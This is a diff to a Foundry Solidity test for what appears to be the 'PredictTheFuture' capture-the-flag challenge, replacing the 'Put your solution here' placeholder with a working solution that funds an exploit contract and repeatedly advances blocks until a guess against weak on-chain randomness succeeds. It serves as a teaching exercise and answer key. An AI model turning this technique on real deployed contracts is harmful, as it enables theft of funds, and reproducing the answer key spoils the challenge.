@@ -13,16 +13,20 @@ contract PredictTheFutureTest is Test {
         // Deploy contracts
         predictTheFuture = (new PredictTheFuture){value: 1 ether}();
         exploitContract = new ExploitContract(predictTheFuture);
+        vm.deal(address(exploitContract), 1 ether);
     }
 
     function testGuess() public {
-        // Set block number and timestamp
-        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
-        vm.roll(104293);
         vm.warp(93582192);
-
-        // Put your solution here
-
+        exploitContract.guess();
+        vm.roll(258);
+        for (uint8 i = 0; i < 10; i++) {
+            if (predictTheFuture.isComplete()) {
+                break;
+            }
+            exploitContract.attemptSettle();
+            vm.roll(block.number + 1);
+        }
         _checkSolved();
     }
 
